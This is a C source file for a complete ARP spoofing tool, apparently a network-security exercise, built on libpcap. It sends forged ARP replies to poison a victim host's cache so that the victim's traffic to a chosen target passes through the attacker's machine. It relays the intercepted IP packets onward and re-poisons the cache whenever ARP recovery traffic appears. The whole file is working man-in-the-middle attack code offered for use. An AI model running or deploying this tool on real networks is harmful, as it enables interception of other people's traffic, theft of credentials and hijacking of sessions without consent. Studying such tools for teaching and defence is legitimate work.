#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>

#define ETHER_ADDR_LEN 6
#define ARPOP_REQUEST 1
#define ARPOP_REPLY 2
#define ETHERTYPE_ARP 0x0806
#define ARPPROTO_IP 0x0800
#define ETHERTYPE_IP 0x0800


#pragma pack(push, 1)
struct ethernet_hdr {
    uint8_t  dstmac[ETHER_ADDR_LEN];
    uint8_t  srcmac[ETHER_ADDR_LEN];
    uint16_t type;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct arp_hdr {
    uint16_t hwtype;
    uint16_t proto;
    uint8_t  hwlen;
    uint8_t  protolen;
    uint16_t op;

    uint8_t  smac[ETHER_ADDR_LEN];
    uint32_t sip;
    uint8_t  tmac[ETHER_ADDR_LEN];
    uint32_t tip;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct ip_hdr {
    uint8_t  v_hl;
    uint8_t  tos;
    uint16_t len;
    uint16_t id;
    uint16_t off;
    uint8_t  ttl;
    uint8_t  p;
    uint16_t sum;
    uint32_t sip;
    uint32_t tip;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct EthArpPacket {
    struct ethernet_hdr eth;
    struct arp_hdr      arp;
};
#pragma pack(pop)

struct ArpSession {
    uint32_t sender_ip;
    uint32_t target_ip;
    uint8_t  sender_mac[ETHER_ADDR_LEN];
    uint8_t  target_mac[ETHER_ADDR_LEN];
};

void usage(void) {
    printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int get_my_mac(const char* dev, uint8_t* mac) {
    struct ifreq ifr;
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        perror("socket");
        return -1;
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
	perror("ioctl(SIOCGIFHWADDR)"); 
        close(s); 
        return -1; 
    }

    memcpy(mac, ifr.ifr_addr.sa_data, ETHER_ADDR_LEN);
    close(s);
    return 0;
}

int get_my_ip(const char* dev, uint32_t* ip) {
    struct ifreq ifr;
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        perror("socket");
        return -1;
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) { 
    perror("ioctl(SIOCGIFADDR)");
    close(s); 
    return -1; 
    }

    *ip = ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr;
    close(s);
    return 0;
}

int send_arp_packet(pcap_t* handle, uint16_t op, uint8_t* src_mac, uint32_t src_ip, uint8_t* dst_mac, uint8_t* target_mac, uint32_t target_ip) {

    struct EthArpPacket pkt;
    memcpy(pkt.eth.dstmac, dst_mac, ETHER_ADDR_LEN);
    memcpy(pkt.eth.srcmac, src_mac, ETHER_ADDR_LEN);
    pkt.eth.type = htons(ETHERTYPE_ARP);
    pkt.arp.hwtype = htons(1);
    pkt.arp.proto = htons(ARPPROTO_IP);
    pkt.arp.hwlen = 6;
    pkt.arp.protolen = 4;
    pkt.arp.op = htons(op);
    memcpy(pkt.arp.smac, src_mac, ETHER_ADDR_LEN);
    pkt.arp.sip = src_ip;
    memcpy(pkt.arp.tmac, target_mac, ETHER_ADDR_LEN);
    pkt.arp.tip = target_ip;
    return pcap_sendpacket(handle, (const u_char*)&pkt, sizeof(pkt));
}

int resolve_mac(pcap_t* handle, uint8_t* my_mac, uint32_t my_ip, uint32_t target_ip, uint8_t* res_mac) {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t zero[6] = {0, 0, 0, 0, 0, 0};
    send_arp_packet(handle, ARPOP_REQUEST, my_mac, my_ip, broadcast, zero, target_ip);
    struct pcap_pkthdr* h; const u_char* p; int res;
    while ((res = pcap_next_ex(handle, &h, &p)) >= 0) {
        if (res == 0) continue;
        struct EthArpPacket* recv = (struct EthArpPacket*)p;
        if (ntohs(recv->eth.type) == ETHERTYPE_ARP && ntohs(recv->arp.op) == ARPOP_REPLY && recv->arp.sip == target_ip) {
            memcpy(res_mac, recv->arp.smac, ETHER_ADDR_LEN);
            return 0;
        }
    }
    return -1;
}

void infect_sender(pcap_t* handle, uint8_t* my_mac, struct ArpSession* s) {
    send_arp_packet(handle, ARPOP_REPLY, my_mac, s->target_ip, s->sender_mac, s->sender_mac, s->sender_ip);
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
    usage();
    return EXIT_FAILURE;
    }

    char* dev = argv[1]; 
    char err[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, err);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s (%s)\n", dev, err);
        return EXIT_FAILURE;
    }

    uint8_t my_mac[6]; 
    uint32_t my_ip;

    get_my_mac(dev, my_mac); 
    get_my_ip(dev, &my_ip);

    int pairs = (argc - 2) / 2;
    struct ArpSession* sessions = malloc(sizeof(struct ArpSession) * pairs);

    for (int i = 0; i < pairs; i++) {
        sessions[i].sender_ip = inet_addr(argv[2 + i * 2]);
        sessions[i].target_ip = inet_addr(argv[3 + i * 2]);
        resolve_mac(handle, my_mac, my_ip, sessions[i].sender_ip, sessions[i].sender_mac);
        resolve_mac(handle, my_mac, my_ip, sessions[i].target_ip, sessions[i].target_mac);
        infect_sender(handle, my_mac, &sessions[i]);
    }

    struct pcap_pkthdr* h; const u_char* p;
    while (pcap_next_ex(handle, &h, &p) >= 0) {
        struct ethernet_hdr* eth = (struct ethernet_hdr*)p;
        if (ntohs(eth->type) == ETHERTYPE_IP) {
            for (int i = 0; i < pairs; i++) {
                if (memcmp(eth->srcmac, sessions[i].sender_mac, 6) == 0 && 
                    memcmp(eth->dstmac, my_mac, 6) == 0) {
                    
                    uint8_t* relay_buf = malloc(h->caplen);
                    memcpy(relay_buf, p, h->caplen);
                    struct ethernet_hdr* reth = (struct ethernet_hdr*)relay_buf;
                    
                    memcpy(reth->srcmac, my_mac, 6);
                    memcpy(reth->dstmac, sessions[i].target_mac, 6);
                    
                    pcap_sendpacket(handle, relay_buf, h->caplen);
                    free(relay_buf);
                    break;
                }
            }
        } else if (ntohs(eth->type) == ETHERTYPE_ARP) {
            struct arp_hdr* arp = (struct arp_hdr*)(p + 14);
            for (int i = 0; i < pairs; i++) {
                if ((arp->sip == sessions[i].sender_ip && arp->tip == sessions[i].target_ip) ||
                    (arp->sip == sessions[i].target_ip && memcmp(eth->dstmac, "\xff\xff\xff\xff\xff\xff", 6) == 0)) {
                    infect_sender(handle, my_mac, &sessions[i]);
                    break;
                }
            }
        }
    }
    free(sessions); pcap_close(handle); return 0;
}
